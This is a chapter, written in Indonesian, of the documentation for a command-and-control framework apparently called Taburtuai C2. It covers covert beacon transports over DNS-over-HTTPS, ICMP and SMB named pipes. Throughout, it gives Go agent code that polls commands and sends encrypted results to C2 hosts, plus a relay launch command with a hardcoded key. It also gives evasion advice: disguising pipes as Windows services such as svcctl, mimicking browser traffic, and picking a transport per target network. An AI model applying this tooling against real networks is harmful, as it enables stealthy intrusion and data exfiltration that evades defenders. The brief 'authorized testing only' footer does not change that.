# 19 — Advanced C2 Transports: DoH, ICMP, SMB Named Pipe

> Tiga transport alternatif untuk situasi di mana HTTP/HTTPS ke server C2 diblokir
> atau mudah dideteksi. Setiap transport menggunakan protokol yang berbeda sebagai
> covert channel.

---

## Perbandingan Transport

| Transport | Port | Protokol | Privilege | Deteksi |
|-----------|------|----------|-----------|---------|
| HTTP/HTTPS | 80/443 | TCP | User | Medium — ada C2 URL di traffic |
| **DoH** | 443 | HTTPS (DNS JSON) | User | Low — terlihat seperti DNS resolver |
| **ICMP** | — | ICMP | User* | Medium — ICMP ping dengan payload besar |
| **SMB Pipe** | 445 | SMB | User | Low — tidak bisa dibedakan dari file sharing |

*IcmpSendEcho2 di Windows tidak membutuhkan raw socket privilege

---

## 11.3 — DNS-over-HTTPS (DoH) Beacon

### Cara Kerja

```
Agent                     DoH Resolver              C2 Server
  │                      (1.1.1.1:443 HTTPS)       (Authoritative NS)
  │                             │                         │
  ├──TXT query: d0.aGVsbG8=.abc12345.c2.example.com──────►│
  │             (encrypted payload encoded as base32)      │
  │◄────────────────────────────────────────────────NOERROR│
  │                                                        │
  ├──TXT query: poll.abc12345.c2.example.com───────────────►│
  │◄────────────────TXT: "base64encodedCommand"────────────│
```

Dari sudut pandang jaringan:
- Agent membuka HTTPS ke `1.1.1.1:443` (Cloudflare) atau `8.8.8.8:443` (Google)
- Traffic terlihat identik dengan DNS resolution normal
- Tidak ada koneksi langsung ke C2 server dari target

### Requirements

```bash
# Server side: perlu DNS zone yang bisa dicontrol
# Domain: c2.example.com harus punya NS records ke server kamu

# Cek dengan dig:
dig +short TXT poll.abc12345.c2.example.com @cloudflare-dns.com
```

### Build Agent dengan DoH Transport

```go
// Dalam agent, gunakan pkg/transport/doh.go:
dohClient := transport.NewDoHClient("c2.example.com", agentID, transport.DoHCloudflare)

// Poll command via DoH
cmd, err := dohClient.PollCommand()

// Send result via DoH
err = dohClient.SendData(encryptedResult)
```

Build var yang perlu ditambahkan ke Makefile (future):
```makefile
TRANSPORT    ?= http   # http | doh | icmp | smb
C2_DOMAIN    ?=        # required untuk doh transport
DOH_PROVIDER ?= cloudflare  # cloudflare | google
```

### Rate Limiting & OPSEC

```go
// DoH client sudah built-in:
// - Random inter-query delay 100-600ms
// - User-Agent sama dengan browser (Mozilla/5.0...)
// - Gunakan HTTPS ke resolver — payload tidak terlihat di network
```

**Limitation:** Throughput rendah — DNS TXT records dibatasi ~4KB per response,
dan banyak query per beacon cycle. Cocok untuk command/response kecil, bukan file transfer.

---

## 11.4 — ICMP C2 Channel (Windows)

### Cara Kerja

```
Agent (target)               C2 Server
     │                           │
     ├──ICMP Echo Request────────►│  payload: [TBUC magic][seq][chunk][data]
     │◄──ICMP Echo Reply──────────┤  payload: [TBUC magic][0xFF][command]
```

Menggunakan `IcmpSendEcho2` dari `iphlpapi.dll` — **tidak membutuhkan raw socket
privilege** karena Windows menyediakan ICMP handle lewat `IcmpCreateFile`.

### Frame Format

```
Offset  Size  Field
0       4     Magic: 0x54425543 ("TBUC")
4       2     Sequence number
6       2     Total chunks in this message
8       1     Chunk index (0xFF = poll request)
9+      N     Data payload
```

### Requirements

**Server side** membutuhkan raw socket listener (root/admin) untuk:
1. Mendeteksi ICMP echo request dengan magic bytes
2. Meng-craft echo reply dengan command payload

```bash
# Linux server listener (harus root):
# Implementasi ada di internal/listener/icmp_listener.go (planned)

# Test dengan ping — lihat apakah ICMP diizinkan ke server:
ping -c 1 <server-ip>
```

### Penggunaan

```go
icmpClient, err := transport.NewICMPClient("192.168.1.10", agentID)
if err != nil {
    // fallback ke HTTP
}

// Poll
cmd, err := icmpClient.PollCommand()

// Send data
err = icmpClient.SendData(resultBytes)

icmpClient.Close()
```

**Limitation:** Butuh ICMP allowed di firewall. Banyak enterprise firewall
memblokir ICMP atau melakukan deep inspection. Cocok untuk internal network.

---

## 11.5 — SMB Named Pipe Transport

### Cara Kerja

```
Target Network                    Relay Host             C2 Server
                                 (internal)
Agent ──SMB:445──► Named Pipe ──► smb_relay ──HTTPS──► C2
                   \\relay\pipe\svcctl
```

**Keunggulan utama:** Agent tidak pernah membuka koneksi TCP langsung ke C2 server.
Dari perspektif firewall, hanya ada traffic SMB ke relay host internal — sama persis
dengan koneksi file sharing normal.

### Setup: SMB Relay

```bash
# Build relay
make smb-relay  # atau:
go build -o bin/smb_relay.exe ./cmd/listener/smb_relay

# Jalankan di pivot host (bisa tanpa admin jika pipe name tersedia)
./smb_relay.exe \
  --pipe svcctl \
  --c2 https://c2.yourdomain.com \
  --key SpookyOrcaC2AES1
```

Relay bisa disamarkan sebagai:
- Service yang legitimate (`svcctl`, `msrpc`, `samr`, `lsarpc`)
- Dijalan sebagai Windows service
- Path: `\\FILESERVER01\pipe\svcctl`

### Agent Configuration

```go
smbClient, err := transport.NewSMBClient(
    "FILESERVER01",  // nama atau IP relay host
    "svcctl",        // nama pipe
    agentID,
)

// Kirim data ke relay → relay forward ke C2
err = smbClient.SendData(encryptedPayload)

// Poll command dari relay
cmd, err := smbClient.PollCommand()
```

### Makefile Integration (planned)

```makefile
# Build agent dengan SMB transport
make agent-win-smb \
  SMB_RELAY=FILESERVER01 \
  SMB_PIPE=svcctl \
  C2_SERVER=https://c2.yourdomain.com
```

### OPSEC Notes

```
✓ Tidak ada outbound HTTP/HTTPS dari target
✓ Traffic SMB normal ke relay host
✓ Relay host bisa berada di subnet yang diizinkan ke internet
✓ Named pipe name bisa disesuaikan dengan legitimate service
✗ Relay host harus accessible via SMB (port 445) dari target
✗ Relay harus online — agent tidak bisa beacon jika relay mati
```

---

## Transport Selection Strategy

```
Target Environment              Recommended Transport
─────────────────────────────   ──────────────────────
Full internet access            HTTPS + malleable profile
DNS outbound allowed            DoH (CloudFlare/Google)
ICMP allowed, no proxy          ICMP (Windows only)
Internal network, SMB allowed   SMB Named Pipe via relay
Air-gapped, USB possible        Out-of-band (manual)
```

**Multi-transport fallback** (planned):
```go
// Agent mencoba transport secara berurutan
transports := []Transport{httpTransport, dohTransport, icmpTransport}
for _, t := range transports {
    if cmd, err := t.PollCommand(); err == nil {
        return cmd, nil
    }
}
```

---

**Selanjutnya:** [20 — Multi-Operator Team Server](20-teamserver.md)

---

*Taburtuai C2 — For authorized security testing only.*
